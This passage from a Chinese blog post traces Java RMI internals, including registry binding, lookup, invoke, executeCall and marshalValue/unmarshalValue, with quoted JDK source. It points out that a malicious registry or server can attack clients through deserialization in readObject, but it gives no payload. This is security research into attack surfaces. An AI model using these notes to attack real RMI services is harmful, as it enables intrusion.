class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里的<strong>skel</strong>是<strong>UnicastServerRef</strong>的内部属性</p>
<p>也就是说创建好的<strong>skeleton</strong>其实会存储在<strong>UnicastServerRef</strong>的<strong>skel</strong>属性中</p>
<p>接着就是走到<strong>Target</strong>里了，也就是储存封装的数据，跟之前的一样</p>
<p>可以看到在<strong>objTable</strong>表中，有三个对象</p>
<p>第一个对象中的<strong>value</strong>的<strong>stub</strong>值为<strong>DGCImpl_Stub</strong>，是分布式垃圾回收的一个对象，它并不是我们刚才创建的，且<strong>disp</strong>的<strong>skel</strong>为<strong>DGCImpl_Skel</strong></p>
<p>第二个对象里的<strong>value</strong>的<strong>stub</strong>值为**$Proxy<strong>对象，是远程对象的，且</strong>disp<strong>的</strong>skel**为空</p>
<p>第三个对象中的<strong>value</strong>的<strong>stub</strong>值为<strong>RegistryImpl_Stub</strong>，是我们刚创建的对象，且<strong>disp</strong>的<strong>skel</strong>为<strong>RegistryImpl_Skel</strong></p>
<h2 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h2><ul>
<li><strong>Registry+Name</strong>方式</li>
</ul>
<p><strong>bindings</strong>就是一个<strong>Hashtable</strong></p>
<p>如果当前的<strong>keySet</strong>中找不到已经绑定的远程对象名，那么就<strong>put</strong>进去远程对象名和远程对象（动态代理）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String name, Remote obj)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span><br><span class="line">&#123;</span><br><span class="line">    checkAccess(<span class="string">&quot;Registry.bind&quot;</span>);</span><br><span class="line">    <span class="keyword">synchronized</span> (bindings) &#123;</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">curr</span> <span class="operator">=</span> bindings.get(name);</span><br><span class="line">        <span class="keyword">if</span> (curr != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AlreadyBoundException</span>(name);</span><br><span class="line">        bindings.put(name, obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="客户端请求注册中心"><a href="#客户端请求注册中心" class="headerlink" title="客户端请求注册中心"></a>客户端请求注册中心</h2><p>会先跳转到这</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> getRegistry(host, port, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>跟进去<strong>getRegistry</strong>方法中</p>
<p>可以看到先接收对应的参数，然后在本地创建了个<strong>LiveRef</strong>对象，<strong>UnicastRef</strong>封装，客户端引用</p>
<ul>
<li><strong>ObjID.REGISTRY_ID</strong>对接的<strong>id&#x3D;&#x3D;0</strong>，<strong>0</strong>代表注册中心</li>
<li><strong>TCPEndpoint</strong>中的是注册中心的<strong>IP</strong>和<strong>port&#x3D;1099</strong></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port,</span></span><br><span class="line"><span class="params">                                   RMIClientSocketFactory csf)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (port &lt;= <span class="number">0</span>)</span><br><span class="line">        port = Registry.REGISTRY_PORT;</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// If host is blank (as returned by &quot;file:&quot; URL in 1.0.2 used in</span></span><br><span class="line">        <span class="comment">// java.rmi.Naming), try to convert to real local host name so</span></span><br><span class="line">        <span class="comment">// that the RegistryImpl&#x27;s checkAccess will not fail.</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            host = java.net.InetAddress.getLocalHost().getHostAddress();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// If that failed, at least try &quot;&quot; (localhost) anyway...</span></span><br><span class="line">            host = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>),</span><br><span class="line">                    <span class="literal">false</span>);</span><br><span class="line">    <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span></span><br><span class="line">        (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line">    <span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>后面又调用了<strong>createProxy</strong>方法</p>
<p>在实现上跟注册中心相差不大，都是使用反射创建代理，也就是<strong>RegistryImpl_Stub</strong>类，这里需要<strong>UnicastRef</strong>参与构造函数</p>
<p>也就是说，注册中心创建的<strong>RegistryImpl_Stub</strong>其实并没有传递给客户端</p>
<p>而是客户端利用了注册中心的<strong>ip</strong>和<strong>port</strong>在本地自己创建了个<strong>RegistryImpl_Stub</strong></p>
<h2 id="客户端lookup远程对象"><a href="#客户端lookup远程对象" class="headerlink" title="客户端lookup远程对象"></a>客户端lookup远程对象</h2><p>首先跟进去<strong>RegistryImpl_Stub</strong>的<strong>lookup</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">            var3.writeObject(var1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line">        Remote var23;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">            var23 = (Remote)var6.readObject();</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">        <span class="keyword">return</span> var23;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到首先会调用一个<strong>newCall</strong>方法</p>
<p>主要功能就是创建一个连接</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> RemoteCall <span class="title function_">newCall</span><span class="params">(RemoteObject obj, Operation[] ops, <span class="type">int</span> opnum,</span></span><br><span class="line"><span class="params">                          <span class="type">long</span> hash)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    clientRefLog.log(Log.BRIEF, <span class="string">&quot;get connection&quot;</span>);</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> ref.getChannel().newConnection();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clientRefLog.log(Log.VERBOSE, <span class="string">&quot;create call context&quot;</span>);</span><br><span class="line">        <span class="comment">/* log information about the outgoing call */</span></span><br><span class="line">        <span class="keyword">if</span> (clientCallLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            logClientCall(obj, ops[opnum]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn, ref.getObjID(), opnum, hash);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            marshalCustomCallData(call.getOutputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshaling &quot;</span> +</span><br><span class="line">                                       <span class="string">&quot;custom call data&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> call;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        ref.getChannel().free(conn, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着返回<strong>lookup</strong>，先获取字符串，将其写进一个输出流里面，序列化进去</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">            var3.writeObject(var1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当前类对象为<strong>RegistryImpl_Stub</strong>，<strong>ref</strong>属性为<strong>UnicastRef</strong></p>
<p>所以之后调用 <strong>UnicastRef</strong>的<strong>invoke</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(RemoteCall call)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clientRefLog.log(Log.VERBOSE, <span class="string">&quot;execute call&quot;</span>);</span><br><span class="line">        call.executeCall();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着会去调用<strong>call</strong>的**executeCall()**方法，是一个真正处理网络请求的方法</p>
<p>在字节流的层面负责传输：</p>
<ul>
<li><p>将客户端想寻找远程对象名字接收，传给注册中心</p>
</li>
<li><p>接收注册中心传递回来的对象的字节流</p>
</li>
</ul>
<p>如果注册中心返回的远程对象的字节流出现异常，<strong>readObject</strong>会执行，而且<strong>in</strong>就是数据流里面的东西</p>
<p>如果一个注册中心返回一个恶意的对象，客户端进行反序列化，这就会导致漏洞</p>
<p>这个地方更隐蔽，危险也更广</p>
<p>因为<strong>invoke–&gt;executeCall</strong>不只是<strong>lookup</strong>存在，还有<strong>bind</strong>、<strong>list</strong>方法也是会调用<strong>invoke</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span> returnType;</span><br><span class="line">    <span class="comment">// read result header</span></span><br><span class="line">    <span class="type">DGCAckHandler</span> <span class="variable">ackHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="comment">// read return value</span></span><br><span class="line">    <span class="keyword">switch</span> (returnType) &#123;</span><br><span class="line">    <span class="keyword">case</span> TransportConstants.NormalReturn:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">        Object ex;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ex = in.readObject();</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>返回<strong>lookup</strong>继续，如果<strong>invoke</strong>完成请求之后</p>
<p>接着又获取一个输入流<strong>var6</strong>，也就是说返回值获取到了</p>
<p>也会通过<strong>readObject</strong>方式执行，<strong>var23</strong>也就是远程对象的动态代理</p>
<p>远程对象会以动态代理的形式返回，里面包含了<strong>Liveref</strong>，需要连接的<strong>ip:port</strong>等等信息</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">            var3.writeObject(var1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line">        Remote var23;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">            var23 = (Remote)var6.readObject();</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">        <span class="keyword">return</span> var23;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>所以说，客户端向注册中心获取远程对象的过程是通过<strong>反序列化</strong>实现的，最后的远程对象是通过<strong>readObject</strong>读出来的</p>
<p>如果有个恶意的注册中心，就可以通过这个来攻击客户端</p>
<h2 id="客户端请求服务端"><a href="#客户端请求服务端" class="headerlink" title="客户端请求服务端"></a>客户端请求服务端</h2><p>动态代理的核心就是<strong>handler</strong>的<strong>invoke</strong>方法</p>
<p>当调用远程对象的方法时，会走<strong>RemoteObjectInvocationHandler</strong>的<strong>invoke</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> Throwable</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (! Proxy.isProxyClass(proxy.getClass())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;not a proxy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (Proxy.getInvocationHandler(proxy) != <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;handler mismatch&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> invokeObjectMethod(proxy, method, args);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;finalize&quot;</span>.equals(method.getName()) &amp;&amp; method.getParameterCount() == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        !allowFinalizeInvocation) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// ignore</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> invokeRemoteMethod(proxy, method, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里会进去<strong>invokeRemoteMethod</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">invokeRemoteMethod</span><span class="params">(Object proxy,</span></span><br><span class="line"><span class="params">                                  Method method,</span></span><br><span class="line"><span class="params">                                  Object[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(proxy <span class="keyword">instanceof</span> Remote)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                <span class="string">&quot;proxy not Remote instance&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                          getMethodHash(method));</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先会去调用<strong>invoke</strong>方法，这是一个重载的方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Remote obj,</span></span><br><span class="line"><span class="params">                     Method method,</span></span><br><span class="line"><span class="params">                     Object[] params,</span></span><br><span class="line"><span class="params">                     <span class="type">long</span> opnum)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">            marshalCustomCallData(out);</span><br><span class="line">            Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">                marshalValue(types[i], params[i], out);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF,</span><br><span class="line">                <span class="string">&quot;IOException marshalling arguments: &quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// unmarshal return</span></span><br><span class="line">        call.executeCall();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后会去调用<strong>marshalValue</strong>方法</p>
<p>判断一堆类型，之后再进行序列化，这里的参数指的是传进去的<strong>hello</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">marshalValue</span><span class="params">(Class&lt;?&gt; type, Object value,</span></span><br><span class="line"><span class="params">                                   ObjectOutput out)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (type.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (type == <span class="type">int</span>.class) &#123;</span><br><span class="line">            out.writeInt(((Integer) value).intValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">            out.writeBoolean(((Boolean) value).booleanValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">byte</span>.class) &#123;</span><br><span class="line">            out.writeByte(((Byte) value).byteValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">char</span>.class) &#123;</span><br><span class="line">            out.writeChar(((Character) value).charValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">short</span>.class) &#123;</span><br><span class="line">            out.writeShort(((Short) value).shortValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">long</span>.class) &#123;</span><br><span class="line">            out.writeLong(((Long) value).longValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">float</span>.class) &#123;</span><br><span class="line">            out.writeFloat(((Float) value).floatValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">double</span>.class) &#123;</span><br><span class="line">            out.writeDouble(((Double) value).doubleValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        out.writeObject(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>序列化之后会调用<strong>call.executeCall</strong>方法，这个危险点在前面有提到</p>
<p>所有的客户端的网络请求都会调用这个方法</p>
<p>接着继续往下走</p>
<p>如果返回值不为<strong>null</strong>，调用<strong>unmarshalValue</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Remote obj,</span></span><br><span class="line"><span class="params">                     Method method,</span></span><br><span class="line"><span class="params">                     Object[] params,</span></span><br><span class="line"><span class="params">                     <span class="type">long</span> opnum)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">        <span class="comment">// unmarshal return</span></span><br><span class="line">        call.executeCall();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; rtype = method.getReturnType();</span><br><span class="line">            <span class="keyword">if</span> (rtype == <span class="keyword">void</span>.class)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line">            </span><br><span class="line">            <span class="type">Object</span> <span class="variable">returnValue</span> <span class="operator">=</span> unmarshalValue(rtype, in);</span><br><span class="line">            </span><br><span class="line">            alreadyFreed = <span class="literal">true</span>;</span><br><span class="line">            ref.getChannel().free(conn, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> returnValue;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//省略部分代码.......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看一下<strong>unmarshalValue</strong>这个方法逻辑</p>
<p>也就是说如果想要获取远程函数调用的结果，是通过反序列化获取的</p>
<p>这里的<strong>unmarshalValue</strong>与前面的<strong>marshalValue</strong>是对称的</p>
<p>我们传进去的是<strong>String</strong>类型的，不符合判断里的条件，所以会读出返回值</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">unmarshalValue</span><span class="params">(Class&lt;?&gt; type, ObjectInput in)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (type.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (type == <span class="type">int</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Integer.valueOf(in.readInt());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(in.readBoolean());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">byte</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Byte.valueOf(in.readByte());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">char</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Character.valueOf(in.readChar());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">short</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Short.valueOf(in.readShort());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">long</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Long.valueOf(in.readLong());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">float</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Float.valueOf(in.readFloat());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">double</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Double.valueOf(in.readDouble());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="注册中心响应客户端"><a href="#注册中心响应客户端" class="headerlink" title="注册中心响应客户端"></a>注册中心响应客户端</h2><p>在<strong>Registry</strong>端，由<strong>sun.rmi.transport.tcp.TCPTransport#handleMessages</strong>来处理请求，调用<strong>serviceCall</strong>方法处理</p>
<p><strong>serviceCall</strong>方法中从<strong>ObjectTable</strong>中获取封装的<strong>Target</strong>对象，并获取其中的封装的<strong>UnicastServerRef</strong>以及<strong>RegistryImpl</strong>对象。然后调用<strong>UnicastServerRef</strong>的<strong>dispatch</strong>方法</p>
